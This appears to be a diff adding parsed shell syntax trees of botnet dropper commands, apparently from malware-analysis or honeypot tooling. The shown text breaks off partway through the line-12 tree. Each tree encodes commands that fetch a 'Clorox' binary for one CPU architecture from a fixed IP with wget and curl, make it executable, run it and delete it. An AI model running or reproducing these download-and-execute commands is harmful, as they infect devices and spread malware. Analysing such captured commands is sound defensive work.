@@ -1,0 +1,583 @@
+ListNode(lineno=2, pos=(12, 207), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 106), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 106), word='http://198.167.136.178/Clorox.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(106, 107)),
+  CommandNode(lineno=2, pos=(108, 150), parts=[
+    WordNode(lineno=2, pos=(108, 112), word='curl'),
+    WordNode(lineno=2, pos=(113, 115), word='-O'),
+    WordNode(lineno=2, pos=(116, 150), word='http://198.167.136.178/Clorox.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(150, 151)),
+  CommandNode(lineno=2, pos=(152, 172), parts=[
+    WordNode(lineno=2, pos=(152, 157), word='chmod'),
+    WordNode(lineno=2, pos=(158, 160), word='+x'),
+    WordNode(lineno=2, pos=(161, 172), word='Clorox.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(172, 173)),
+  CommandNode(lineno=2, pos=(174, 187), parts=[
+    WordNode(lineno=2, pos=(174, 187), word='./Clorox.mips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(187, 188)),
+  CommandNode(lineno=2, pos=(189, 207), parts=[
+    WordNode(lineno=2, pos=(189, 191), word='rm'),
+    WordNode(lineno=2, pos=(192, 195), word='-rf'),
+    WordNode(lineno=2, pos=(196, 207), word='Clorox.mips'),
+  ]),
+])
+ListNode(lineno=3, pos=(208, 403), parts=[
+  CommandNode(lineno=3, pos=(208, 215), parts=[
+    WordNode(lineno=3, pos=(208, 210), word='cd'),
+    WordNode(lineno=3, pos=(211, 215), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(216, 218)),
+  CommandNode(lineno=3, pos=(219, 230), parts=[
+    WordNode(lineno=3, pos=(219, 221), word='cd'),
+    WordNode(lineno=3, pos=(222, 230), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(231, 233)),
+  CommandNode(lineno=3, pos=(234, 241), parts=[
+    WordNode(lineno=3, pos=(234, 236), word='cd'),
+    WordNode(lineno=3, pos=(237, 241), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(242, 244)),
+  CommandNode(lineno=3, pos=(245, 253), parts=[
+    WordNode(lineno=3, pos=(245, 247), word='cd'),
+    WordNode(lineno=3, pos=(248, 253), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(254, 256)),
+  CommandNode(lineno=3, pos=(257, 261), parts=[
+    WordNode(lineno=3, pos=(257, 259), word='cd'),
+    WordNode(lineno=3, pos=(260, 261), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(261, 262)),
+  CommandNode(lineno=3, pos=(263, 302), parts=[
+    WordNode(lineno=3, pos=(263, 267), word='wget'),
+    WordNode(lineno=3, pos=(268, 302), word='http://198.167.136.178/Clorox.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(302, 303)),
+  CommandNode(lineno=3, pos=(304, 346), parts=[
+    WordNode(lineno=3, pos=(304, 308), word='curl'),
+    WordNode(lineno=3, pos=(309, 311), word='-O'),
+    WordNode(lineno=3, pos=(312, 346), word='http://198.167.136.178/Clorox.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(346, 347)),
+  CommandNode(lineno=3, pos=(348, 368), parts=[
+    WordNode(lineno=3, pos=(348, 353), word='chmod'),
+    WordNode(lineno=3, pos=(354, 356), word='+x'),
+    WordNode(lineno=3, pos=(357, 368), word='Clorox.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(368, 369)),
+  CommandNode(lineno=3, pos=(370, 383), parts=[
+    WordNode(lineno=3, pos=(370, 383), word='./Clorox.mpsl'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(383, 384)),
+  CommandNode(lineno=3, pos=(385, 403), parts=[
+    WordNode(lineno=3, pos=(385, 387), word='rm'),
+    WordNode(lineno=3, pos=(388, 391), word='-rf'),
+    WordNode(lineno=3, pos=(392, 403), word='Clorox.mpsl'),
+  ]),
+])
+ListNode(lineno=4, pos=(404, 594), parts=[
+  CommandNode(lineno=4, pos=(404, 411), parts=[
+    WordNode(lineno=4, pos=(404, 406), word='cd'),
+    WordNode(lineno=4, pos=(407, 411), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(412, 414)),
+  CommandNode(lineno=4, pos=(415, 426), parts=[
+    WordNode(lineno=4, pos=(415, 417), word='cd'),
+    WordNode(lineno=4, pos=(418, 426), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(427, 429)),
+  CommandNode(lineno=4, pos=(430, 437), parts=[
+    WordNode(lineno=4, pos=(430, 432), word='cd'),
+    WordNode(lineno=4, pos=(433, 437), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(438, 440)),
+  CommandNode(lineno=4, pos=(441, 449), parts=[
+    WordNode(lineno=4, pos=(441, 443), word='cd'),
+    WordNode(lineno=4, pos=(444, 449), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(450, 452)),
+  CommandNode(lineno=4, pos=(453, 457), parts=[
+    WordNode(lineno=4, pos=(453, 455), word='cd'),
+    WordNode(lineno=4, pos=(456, 457), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(457, 458)),
+  CommandNode(lineno=4, pos=(459, 497), parts=[
+    WordNode(lineno=4, pos=(459, 463), word='wget'),
+    WordNode(lineno=4, pos=(464, 497), word='http://198.167.136.178/Clorox.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(497, 498)),
+  CommandNode(lineno=4, pos=(499, 540), parts=[
+    WordNode(lineno=4, pos=(499, 503), word='curl'),
+    WordNode(lineno=4, pos=(504, 506), word='-O'),
+    WordNode(lineno=4, pos=(507, 540), word='http://198.167.136.178/Clorox.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(540, 541)),
+  CommandNode(lineno=4, pos=(542, 561), parts=[
+    WordNode(lineno=4, pos=(542, 547), word='chmod'),
+    WordNode(lineno=4, pos=(548, 550), word='+x'),
+    WordNode(lineno=4, pos=(551, 561), word='Clorox.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(561, 562)),
+  CommandNode(lineno=4, pos=(563, 575), parts=[
+    WordNode(lineno=4, pos=(563, 575), word='./Clorox.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(575, 576)),
+  CommandNode(lineno=4, pos=(577, 594), parts=[
+    WordNode(lineno=4, pos=(577, 579), word='rm'),
+    WordNode(lineno=4, pos=(580, 583), word='-rf'),
+    WordNode(lineno=4, pos=(584, 594), word='Clorox.sh4'),
+  ]),
+])
+ListNode(lineno=5, pos=(595, 785), parts=[
+  CommandNode(lineno=5, pos=(595, 602), parts=[
+    WordNode(lineno=5, pos=(595, 597), word='cd'),
+    WordNode(lineno=5, pos=(598, 602), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(603, 605)),
+  CommandNode(lineno=5, pos=(606, 617), parts=[
+    WordNode(lineno=5, pos=(606, 608), word='cd'),
+    WordNode(lineno=5, pos=(609, 617), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(618, 620)),
+  CommandNode(lineno=5, pos=(621, 628), parts=[
+    WordNode(lineno=5, pos=(621, 623), word='cd'),
+    WordNode(lineno=5, pos=(624, 628), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(629, 631)),
+  CommandNode(lineno=5, pos=(632, 640), parts=[
+    WordNode(lineno=5, pos=(632, 634), word='cd'),
+    WordNode(lineno=5, pos=(635, 640), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(641, 643)),
+  CommandNode(lineno=5, pos=(644, 648), parts=[
+    WordNode(lineno=5, pos=(644, 646), word='cd'),
+    WordNode(lineno=5, pos=(647, 648), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(648, 649)),
+  CommandNode(lineno=5, pos=(650, 688), parts=[
+    WordNode(lineno=5, pos=(650, 654), word='wget'),
+    WordNode(lineno=5, pos=(655, 688), word='http://198.167.136.178/Clorox.x86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(688, 689)),
+  CommandNode(lineno=5, pos=(690, 731), parts=[
+    WordNode(lineno=5, pos=(690, 694), word='curl'),
+    WordNode(lineno=5, pos=(695, 697), word='-O'),
+    WordNode(lineno=5, pos=(698, 731), word='http://198.167.136.178/Clorox.x86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(731, 732)),
+  CommandNode(lineno=5, pos=(733, 752), parts=[
+    WordNode(lineno=5, pos=(733, 738), word='chmod'),
+    WordNode(lineno=5, pos=(739, 741), word='+x'),
+    WordNode(lineno=5, pos=(742, 752), word='Clorox.x86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(752, 753)),
+  CommandNode(lineno=5, pos=(754, 766), parts=[
+    WordNode(lineno=5, pos=(754, 766), word='./Clorox.x86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(766, 767)),
+  CommandNode(lineno=5, pos=(768, 785), parts=[
+    WordNode(lineno=5, pos=(768, 770), word='rm'),
+    WordNode(lineno=5, pos=(771, 774), word='-rf'),
+    WordNode(lineno=5, pos=(775, 785), word='Clorox.x86'),
+  ]),
+])
+ListNode(lineno=6, pos=(786, 976), parts=[
+  CommandNode(lineno=6, pos=(786, 793), parts=[
+    WordNode(lineno=6, pos=(786, 788), word='cd'),
+    WordNode(lineno=6, pos=(789, 793), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(794, 796)),
+  CommandNode(lineno=6, pos=(797, 808), parts=[
+    WordNode(lineno=6, pos=(797, 799), word='cd'),
+    WordNode(lineno=6, pos=(800, 808), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(809, 811)),
+  CommandNode(lineno=6, pos=(812, 819), parts=[
+    WordNode(lineno=6, pos=(812, 814), word='cd'),
+    WordNode(lineno=6, pos=(815, 819), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(820, 822)),
+  CommandNode(lineno=6, pos=(823, 831), parts=[
+    WordNode(lineno=6, pos=(823, 825), word='cd'),
+    WordNode(lineno=6, pos=(826, 831), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(832, 834)),
+  CommandNode(lineno=6, pos=(835, 839), parts=[
+    WordNode(lineno=6, pos=(835, 837), word='cd'),
+    WordNode(lineno=6, pos=(838, 839), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(839, 840)),
+  CommandNode(lineno=6, pos=(841, 879), parts=[
+    WordNode(lineno=6, pos=(841, 845), word='wget'),
+    WordNode(lineno=6, pos=(846, 879), word='http://198.167.136.178/Clorox.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(879, 880)),
+  CommandNode(lineno=6, pos=(881, 922), parts=[
+    WordNode(lineno=6, pos=(881, 885), word='curl'),
+    WordNode(lineno=6, pos=(886, 888), word='-O'),
+    WordNode(lineno=6, pos=(889, 922), word='http://198.167.136.178/Clorox.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(922, 923)),
+  CommandNode(lineno=6, pos=(924, 943), parts=[
+    WordNode(lineno=6, pos=(924, 929), word='chmod'),
+    WordNode(lineno=6, pos=(930, 932), word='+x'),
+    WordNode(lineno=6, pos=(933, 943), word='Clorox.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(943, 944)),
+  CommandNode(lineno=6, pos=(945, 957), parts=[
+    WordNode(lineno=6, pos=(945, 957), word='./Clorox.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(957, 958)),
+  CommandNode(lineno=6, pos=(959, 976), parts=[
+    WordNode(lineno=6, pos=(959, 961), word='rm'),
+    WordNode(lineno=6, pos=(962, 965), word='-rf'),
+    WordNode(lineno=6, pos=(966, 976), word='Clorox.arm'),
+  ]),
+])
+ListNode(lineno=7, pos=(977, 1167), parts=[
+  CommandNode(lineno=7, pos=(977, 984), parts=[
+    WordNode(lineno=7, pos=(977, 979), word='cd'),
+    WordNode(lineno=7, pos=(980, 984), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(985, 987)),
+  CommandNode(lineno=7, pos=(988, 999), parts=[
+    WordNode(lineno=7, pos=(988, 990), word='cd'),
+    WordNode(lineno=7, pos=(991, 999), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1000, 1002)),
+  CommandNode(lineno=7, pos=(1003, 1010), parts=[
+    WordNode(lineno=7, pos=(1003, 1005), word='cd'),
+    WordNode(lineno=7, pos=(1006, 1010), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1011, 1013)),
+  CommandNode(lineno=7, pos=(1014, 1022), parts=[
+    WordNode(lineno=7, pos=(1014, 1016), word='cd'),
+    WordNode(lineno=7, pos=(1017, 1022), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1023, 1025)),
+  CommandNode(lineno=7, pos=(1026, 1030), parts=[
+    WordNode(lineno=7, pos=(1026, 1028), word='cd'),
+    WordNode(lineno=7, pos=(1029, 1030), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1030, 1031)),
+  CommandNode(lineno=7, pos=(1032, 1070), parts=[
+    WordNode(lineno=7, pos=(1032, 1036), word='wget'),
+    WordNode(lineno=7, pos=(1037, 1070), word='http://198.167.136.178/Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1070, 1071)),
+  CommandNode(lineno=7, pos=(1072, 1113), parts=[
+    WordNode(lineno=7, pos=(1072, 1076), word='curl'),
+    WordNode(lineno=7, pos=(1077, 1079), word='-O'),
+    WordNode(lineno=7, pos=(1080, 1113), word='http://198.167.136.178/Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1113, 1114)),
+  CommandNode(lineno=7, pos=(1115, 1134), parts=[
+    WordNode(lineno=7, pos=(1115, 1120), word='chmod'),
+    WordNode(lineno=7, pos=(1121, 1123), word='+x'),
+    WordNode(lineno=7, pos=(1124, 1134), word='Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1134, 1135)),
+  CommandNode(lineno=7, pos=(1136, 1148), parts=[
+    WordNode(lineno=7, pos=(1136, 1148), word='./Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1148, 1149)),
+  CommandNode(lineno=7, pos=(1150, 1167), parts=[
+    WordNode(lineno=7, pos=(1150, 1152), word='rm'),
+    WordNode(lineno=7, pos=(1153, 1156), word='-rf'),
+    WordNode(lineno=7, pos=(1157, 1167), word='Clorox.pcc'),
+  ]),
+])
+ListNode(lineno=8, pos=(1168, 1363), parts=[
+  CommandNode(lineno=8, pos=(1168, 1175), parts=[
+    WordNode(lineno=8, pos=(1168, 1170), word='cd'),
+    WordNode(lineno=8, pos=(1171, 1175), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1176, 1178)),
+  CommandNode(lineno=8, pos=(1179, 1190), parts=[
+    WordNode(lineno=8, pos=(1179, 1181), word='cd'),
+    WordNode(lineno=8, pos=(1182, 1190), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1191, 1193)),
+  CommandNode(lineno=8, pos=(1194, 1201), parts=[
+    WordNode(lineno=8, pos=(1194, 1196), word='cd'),
+    WordNode(lineno=8, pos=(1197, 1201), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1202, 1204)),
+  CommandNode(lineno=8, pos=(1205, 1213), parts=[
+    WordNode(lineno=8, pos=(1205, 1207), word='cd'),
+    WordNode(lineno=8, pos=(1208, 1213), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1214, 1216)),
+  CommandNode(lineno=8, pos=(1217, 1221), parts=[
+    WordNode(lineno=8, pos=(1217, 1219), word='cd'),
+    WordNode(lineno=8, pos=(1220, 1221), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1221, 1222)),
+  CommandNode(lineno=8, pos=(1223, 1262), parts=[
+    WordNode(lineno=8, pos=(1223, 1227), word='wget'),
+    WordNode(lineno=8, pos=(1228, 1262), word='http://198.167.136.178/Clorox.i686'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1262, 1263)),
+  CommandNode(lineno=8, pos=(1264, 1306), parts=[
+    WordNode(lineno=8, pos=(1264, 1268), word='curl'),
+    WordNode(lineno=8, pos=(1269, 1271), word='-O'),
+    WordNode(lineno=8, pos=(1272, 1306), word='http://198.167.136.178/Clorox.i686'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1306, 1307)),
+  CommandNode(lineno=8, pos=(1308, 1328), parts=[
+    WordNode(lineno=8, pos=(1308, 1313), word='chmod'),
+    WordNode(lineno=8, pos=(1314, 1316), word='+x'),
+    WordNode(lineno=8, pos=(1317, 1328), word='Clorox.i686'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1328, 1329)),
+  CommandNode(lineno=8, pos=(1330, 1343), parts=[
+    WordNode(lineno=8, pos=(1330, 1343), word='./Clorox.i686'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1343, 1344)),
+  CommandNode(lineno=8, pos=(1345, 1363), parts=[
+    WordNode(lineno=8, pos=(1345, 1347), word='rm'),
+    WordNode(lineno=8, pos=(1348, 1351), word='-rf'),
+    WordNode(lineno=8, pos=(1352, 1363), word='Clorox.i686'),
+  ]),
+])
+ListNode(lineno=9, pos=(1364, 1559), parts=[
+  CommandNode(lineno=9, pos=(1364, 1371), parts=[
+    WordNode(lineno=9, pos=(1364, 1366), word='cd'),
+    WordNode(lineno=9, pos=(1367, 1371), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1372, 1374)),
+  CommandNode(lineno=9, pos=(1375, 1386), parts=[
+    WordNode(lineno=9, pos=(1375, 1377), word='cd'),
+    WordNode(lineno=9, pos=(1378, 1386), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1387, 1389)),
+  CommandNode(lineno=9, pos=(1390, 1397), parts=[
+    WordNode(lineno=9, pos=(1390, 1392), word='cd'),
+    WordNode(lineno=9, pos=(1393, 1397), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1398, 1400)),
+  CommandNode(lineno=9, pos=(1401, 1409), parts=[
+    WordNode(lineno=9, pos=(1401, 1403), word='cd'),
+    WordNode(lineno=9, pos=(1404, 1409), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1410, 1412)),
+  CommandNode(lineno=9, pos=(1413, 1417), parts=[
+    WordNode(lineno=9, pos=(1413, 1415), word='cd'),
+    WordNode(lineno=9, pos=(1416, 1417), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1417, 1418)),
+  CommandNode(lineno=9, pos=(1419, 1458), parts=[
+    WordNode(lineno=9, pos=(1419, 1423), word='wget'),
+    WordNode(lineno=9, pos=(1424, 1458), word='http://198.167.136.178/Clorox.i586'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1458, 1459)),
+  CommandNode(lineno=9, pos=(1460, 1502), parts=[
+    WordNode(lineno=9, pos=(1460, 1464), word='curl'),
+    WordNode(lineno=9, pos=(1465, 1467), word='-O'),
+    WordNode(lineno=9, pos=(1468, 1502), word='http://198.167.136.178/Clorox.i586'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1502, 1503)),
+  CommandNode(lineno=9, pos=(1504, 1524), parts=[
+    WordNode(lineno=9, pos=(1504, 1509), word='chmod'),
+    WordNode(lineno=9, pos=(1510, 1512), word='+x'),
+    WordNode(lineno=9, pos=(1513, 1524), word='Clorox.i586'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1524, 1525)),
+  CommandNode(lineno=9, pos=(1526, 1539), parts=[
+    WordNode(lineno=9, pos=(1526, 1539), word='./Clorox.i586'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1539, 1540)),
+  CommandNode(lineno=9, pos=(1541, 1559), parts=[
+    WordNode(lineno=9, pos=(1541, 1543), word='rm'),
+    WordNode(lineno=9, pos=(1544, 1547), word='-rf'),
+    WordNode(lineno=9, pos=(1548, 1559), word='Clorox.i586'),
+  ]),
+])
+ListNode(lineno=10, pos=(1560, 1755), parts=[
+  CommandNode(lineno=10, pos=(1560, 1567), parts=[
+    WordNode(lineno=10, pos=(1560, 1562), word='cd'),
+    WordNode(lineno=10, pos=(1563, 1567), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1568, 1570)),
+  CommandNode(lineno=10, pos=(1571, 1582), parts=[
+    WordNode(lineno=10, pos=(1571, 1573), word='cd'),
+    WordNode(lineno=10, pos=(1574, 1582), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1583, 1585)),
+  CommandNode(lineno=10, pos=(1586, 1593), parts=[
+    WordNode(lineno=10, pos=(1586, 1588), word='cd'),
+    WordNode(lineno=10, pos=(1589, 1593), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1594, 1596)),
+  CommandNode(lineno=10, pos=(1597, 1605), parts=[
+    WordNode(lineno=10, pos=(1597, 1599), word='cd'),
+    WordNode(lineno=10, pos=(1600, 1605), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1606, 1608)),
+  CommandNode(lineno=10, pos=(1609, 1613), parts=[
+    WordNode(lineno=10, pos=(1609, 1611), word='cd'),
+    WordNode(lineno=10, pos=(1612, 1613), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1613, 1614)),
+  CommandNode(lineno=10, pos=(1615, 1654), parts=[
+    WordNode(lineno=10, pos=(1615, 1619), word='wget'),
+    WordNode(lineno=10, pos=(1620, 1654), word='http://198.167.136.178/Clorox.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1654, 1655)),
+  CommandNode(lineno=10, pos=(1656, 1698), parts=[
+    WordNode(lineno=10, pos=(1656, 1660), word='curl'),
+    WordNode(lineno=10, pos=(1661, 1663), word='-O'),
+    WordNode(lineno=10, pos=(1664, 1698), word='http://198.167.136.178/Clorox.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1698, 1699)),
+  CommandNode(lineno=10, pos=(1700, 1720), parts=[
+    WordNode(lineno=10, pos=(1700, 1705), word='chmod'),
+    WordNode(lineno=10, pos=(1706, 1708), word='+x'),
+    WordNode(lineno=10, pos=(1709, 1720), word='Clorox.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1720, 1721)),
+  CommandNode(lineno=10, pos=(1722, 1735), parts=[
+    WordNode(lineno=10, pos=(1722, 1735), word='./Clorox.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1735, 1736)),
+  CommandNode(lineno=10, pos=(1737, 1755), parts=[
+    WordNode(lineno=10, pos=(1737, 1739), word='rm'),
+    WordNode(lineno=10, pos=(1740, 1743), word='-rf'),
+    WordNode(lineno=10, pos=(1744, 1755), word='Clorox.m68k'),
+  ]),
+])
+ListNode(lineno=11, pos=(1756, 1946), parts=[
+  CommandNode(lineno=11, pos=(1756, 1763), parts=[
+    WordNode(lineno=11, pos=(1756, 1758), word='cd'),
+    WordNode(lineno=11, pos=(1759, 1763), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1764, 1766)),
+  CommandNode(lineno=11, pos=(1767, 1778), parts=[
+    WordNode(lineno=11, pos=(1767, 1769), word='cd'),
+    WordNode(lineno=11, pos=(1770, 1778), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1779, 1781)),
+  CommandNode(lineno=11, pos=(1782, 1789), parts=[
+    WordNode(lineno=11, pos=(1782, 1784), word='cd'),
+    WordNode(lineno=11, pos=(1785, 1789), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1790, 1792)),
+  CommandNode(lineno=11, pos=(1793, 1801), parts=[
+    WordNode(lineno=11, pos=(1793, 1795), word='cd'),
+    WordNode(lineno=11, pos=(1796, 1801), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1802, 1804)),
+  CommandNode(lineno=11, pos=(1805, 1809), parts=[
+    WordNode(lineno=11, pos=(1805, 1807), word='cd'),
+    WordNode(lineno=11, pos=(1808, 1809), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1809, 1810)),
+  CommandNode(lineno=11, pos=(1811, 1849), parts=[
+    WordNode(lineno=11, pos=(1811, 1815), word='wget'),
+    WordNode(lineno=11, pos=(1816, 1849), word='http://198.167.136.178/Clorox.spc'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1849, 1850)),
+  CommandNode(lineno=11, pos=(1851, 1892), parts=[
+    WordNode(lineno=11, pos=(1851, 1855), word='curl'),
+    WordNode(lineno=11, pos=(1856, 1858), word='-O'),
+    WordNode(lineno=11, pos=(1859, 1892), word='http://198.167.136.178/Clorox.spc'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1892, 1893)),
+  CommandNode(lineno=11, pos=(1894, 1913), parts=[
+    WordNode(lineno=11, pos=(1894, 1899), word='chmod'),
+    WordNode(lineno=11, pos=(1900, 1902), word='+x'),
+    WordNode(lineno=11, pos=(1903, 1913), word='Clorox.spc'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1913, 1914)),
+  CommandNode(lineno=11, pos=(1915, 1927), parts=[
+    WordNode(lineno=11, pos=(1915, 1927), word='./Clorox.spc'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1927, 1928)),
+  CommandNode(lineno=11, pos=(1929, 1946), parts=[
+    WordNode(lineno=11, pos=(1929, 1931), word='rm'),
+    WordNode(lineno=11, pos=(1932, 1935), word='-rf'),
+    WordNode(lineno=11, pos=(1936, 1946), word='Clorox.spc'),
+  ]),
+])
+ListNode(lineno=12, pos=(1947, 2137), parts=[
+  CommandNode(lineno=12, pos=(1947, 1954), parts=[
+    WordNode(lineno=12, pos=(1947, 1949), word='cd'),
+    WordNode(lineno=12, pos=(1950, 1954), word='/tmp'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1955, 1957)),
+  CommandNode(lineno=12, pos=(1958, 1969), parts=[
+    WordNode(lineno=12, pos=(1958, 1960), word='cd'),
+    WordNode(lineno=12, pos=(1961, 1969), word='/var/run'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1970, 1972)),
+  CommandNode(lineno=12, pos=(1973, 1980), parts=[
+    WordNode(lineno=12, pos=(1973, 1975), word='cd'),
+    WordNode(lineno=12, pos=(1976, 1980), word='/mnt'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1981, 1983)),
+  CommandNode(lineno=12, pos=(1984, 1992), parts=[
+    WordNode(lineno=12, pos=(1984, 1986), word='cd'),
+    WordNode(lineno=12, pos=(1987, 1992), word='/root'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1993, 1995)),
+  CommandNode(lineno=12, pos=(1996, 2000), parts=[
+    WordNode(lineno=12, pos=(1996, 1998), word='cd'),
+    WordNode(lineno=12, pos=(1999, 2000), word='/'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(2000, 2001)),
+  CommandNode(lineno=12, pos=(2002, 2040), parts=[
+    WordNode(lineno=12, pos=(2002, 2006), word='wget'),
+    WordNode(lineno=12, pos=(2007, 2040), word='http://198.167.136.178/Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(2040, 2041)),
+  CommandNode(lineno=12, pos=(2042, 2083), parts=[
+    WordNode(lineno=12, pos=(2042, 2046), word='curl'),
+    WordNode(lineno=12, pos=(2047, 2049), word='-O'),
+    WordNode(lineno=12, pos=(2050, 2083), word='http://198.167.136.178/Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(2083, 2084)),
+  CommandNode(lineno=12, pos=(2085, 2104), parts=[
+    WordNode(lineno=12, pos=(2085, 2090), word='chmod'),
+    WordNode(lineno=12, pos=(2091, 2093), word='+x'),
+    WordNode(lineno=12, pos=(2094, 2104), word='Clorox.pcc'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(2104, 2105)),
+  CommandNode(lineno=12, pos=(2106, 2118), parts=[
+    WordNode(lineno=12, pos=(2106, 2118), word='./Clorox.pcc'),
+  ]),
